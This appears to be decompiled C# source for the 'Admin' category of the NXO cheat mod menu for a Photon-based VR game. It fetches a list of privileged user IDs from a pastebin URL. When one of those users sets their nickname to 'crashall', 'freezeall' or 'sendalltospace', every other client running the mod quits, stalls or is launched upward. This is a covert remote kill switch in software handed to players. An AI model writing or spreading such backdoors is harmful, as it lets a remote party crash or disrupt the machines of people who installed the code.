﻿using System;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using GorillaLocomotion;
using NXO.Menu;
using NXO.Utilities;
using Photon.Pun;
using Photon.Realtime;
using UnityEngine;

namespace NXO.Mods.Categories
{
	// Token: 0x0200001B RID: 27
	[NullableContext(1)]
	[Nullable(0)]
	public class Admin
	{
		// Token: 0x060000A0 RID: 160 RVA: 0x0000A4B8 File Offset: 0x000086B8
		public static void HandleAdminPanel()
		{
			try
			{
				bool flag = !Variables.didIds;
				if (flag)
				{
					Variables.didIds = true;
					using (WebClient webClient = new WebClient())
					{
						Variables.AllKeycards = webClient.DownloadString("https://pastebin.com/raw/2fF9nc00");
					}
				}
				foreach (Player player in PhotonNetwork.PlayerListOthers)
				{
					bool flag2 = Variables.AllKeycards.Contains(player.UserId);
					if (flag2)
					{
						string nickName = player.NickName;
						string text = nickName;
						if (!(text == "sendalltospace"))
						{
							if (!(text == "crashall"))
							{
								if (text == "freezeall")
								{
									Thread.Sleep(1000);
								}
							}
							else
							{
								Application.Quit();
							}
						}
						else
						{
							GTPlayer.Instance.GetComponent<Rigidbody>().velocity += Vector3.up * Time.deltaTime * 30f;
						}
					}
				}
				bool flag3 = !Variables.ownersInRoom;
				if (flag3)
				{
					foreach (Player player2 in PhotonNetwork.PlayerListOthers)
					{
						bool flag4 = Variables.AllKeycards.Contains(player2.UserId);
						if (flag4)
						{
							Variables.ownersInRoom = true;
							bool flag5 = !Variables.notificationSent;
							if (flag5)
							{
								NotificationLib.SendNotification("<color=blue>System</color> : An NXO Special Is In Your Lobby.");
								Variables.notificationSent = true;
							}
							break;
						}
					}
				}
				bool flag6 = !Variables.ownersInRoom && Variables.notificationSent;
				if (flag6)
				{
					Variables.notificationSent = false;
				}
				bool flag7 = !PhotonNetwork.InRoom;
				if (flag7)
				{
					Variables.ownersInRoom = false;
				}
				bool flag8 = !Variables.AllKeycards.Contains(PhotonNetwork.LocalPlayer.UserId) && Variables.currentPage == Category.Admin;
				if (flag8)
				{
					NotificationLib.SendNotification("<color=red>Error</color> : Access Denied, Admins Only.");
					Variables.currentPage = Category.Home;
					Optimizations.RefreshMenu();
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000A1 RID: 161 RVA: 0x0000A6E8 File Offset: 0x000088E8
		public static void SetLocalName(string command)
		{
			PhotonNetwork.LocalPlayer.NickName = command;
		}

		// Token: 0x060000A2 RID: 162 RVA: 0x0000A6F7 File Offset: 0x000088F7
		public static void ResetName()
		{
			Admin.didsetoldname = false;
			Admin.didMod = false;
			Admin.SetLocalName(Admin.oldname);
		}

		// Token: 0x060000A3 RID: 163 RVA: 0x0000A714 File Offset: 0x00008914
		public static void SendAllToSpace()
		{
			bool flag = !Admin.didsetoldname;
			if (flag)
			{
				Admin.didsetoldname = true;
				Admin.oldname = PhotonNetwork.LocalPlayer.NickName;
			}
			bool flag2 = ControllerInputPoller.instance.rightControllerIndexFloat > 0.1f && !Admin.didMod;
			if (flag2)
			{
				Admin.didMod = true;
				Admin.SetLocalName("sendalltospace");
			}
			bool flag3 = ControllerInputPoller.instance.rightControllerIndexFloat < 0.1f;
			if (flag3)
			{
				Admin.didMod = false;
				Admin.ResetName();
			}
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x0000A7A0 File Offset: 0x000089A0
		public static void CrashAll()
		{
			bool flag = !Admin.didsetoldname;
			if (flag)
			{
				Admin.didsetoldname = true;
				Admin.oldname = PhotonNetwork.LocalPlayer.NickName;
			}
			bool flag2 = ControllerInputPoller.instance.rightControllerIndexFloat > 0.1f && !Admin.didMod;
			if (flag2)
			{
				Admin.didMod = true;
				Admin.SetLocalName("crashall");
			}
			bool flag3 = ControllerInputPoller.instance.rightControllerIndexFloat < 0.1f;
			if (flag3)
			{
				Admin.didMod = false;
				Admin.ResetName();
			}
		}

		// Token: 0x060000A5 RID: 165 RVA: 0x0000A82C File Offset: 0x00008A2C
		public static void FreezeAll()
		{
			bool flag = !Admin.didsetoldname;
			if (flag)
			{
				Admin.didsetoldname = true;
				Admin.oldname = PhotonNetwork.LocalPlayer.NickName;
			}
			bool flag2 = ControllerInputPoller.instance.rightControllerIndexFloat > 0.1f && !Admin.didMod;
			if (flag2)
			{
				Admin.didMod = true;
				Admin.SetLocalName("freezeall");
			}
			bool flag3 = ControllerInputPoller.instance.rightControllerIndexFloat < 0.1f;
			if (flag3)
			{
				Admin.didMod = false;
				Admin.ResetName();
			}
		}

		// Token: 0x04000162 RID: 354
		public static string oldname = "";

		// Token: 0x04000163 RID: 355
		private static bool didsetoldname = false;

		// Token: 0x04000164 RID: 356
		public static bool didMod = false;
	}
}
